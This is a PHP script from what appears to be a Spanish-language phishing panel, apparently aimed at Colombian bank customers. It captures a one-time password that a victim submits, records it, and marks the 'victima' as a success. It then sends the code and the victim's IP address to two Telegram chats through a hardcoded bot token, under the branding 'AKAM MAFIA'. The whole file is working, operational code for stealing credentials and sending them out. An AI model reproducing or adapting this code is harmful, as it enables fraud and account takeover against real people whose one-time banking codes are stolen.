<?php
require_once('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$ip = $_SERVER['REMOTE_ADDR'];
$otp = isset($_POST['otp']) ? $_POST['otp'] : ''; 

if (!empty($otp)) {
    // 1. Guardar en el panel local
    if (function_exists('traer_regitro') && function_exists('actualizar_registro_otp')) {
        $registro = traer_regitro($ip);
        actualizar_registro_otp($registro, $otp);
    }

    // 2. CAMBIO DE ESTADO: Lo mandamos a SUCCESS (10) o lo dejas en WAITING (0)
    // Si quieres que termine el proceso, usa "10".
    if (function_exists('actualizar_estado_victima')) {
        actualizar_estado_victima($ip, "10"); 
    }

    // 3. Configuración del Bot de 𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐
    $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
    $chat_ids = ["8114050673", "8518977918"]; 

    // 4. Formato del mensaje
    $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - CLAVE DINÁMICA</b> ⭐\n\n";
    $mensaje .= "👤 <b>IP:</b> <code>" . $ip . "</code>\n";
    $mensaje .= "🔐 <b>OTP:</b> <code>" . $otp . "</code>\n";
    $mensaje .= "⏰ <b>FECHA:</b> " . date('d/m/Y H:i:s') . "\n";
    $mensaje .= "━━━━━━━━━━━━━━━";

    // 5. Envío a Telegram con CURL
    foreach ($chat_ids as $id) {
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
        $params = [
            'chat_id' => $id,
            'text' => $mensaje,
            'parse_mode' => 'HTML'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        
        curl_exec($ch);
        curl_close($ch);
    }
}

// Redirección final para que el JS siga trabajando
echo "ok"; 
?>
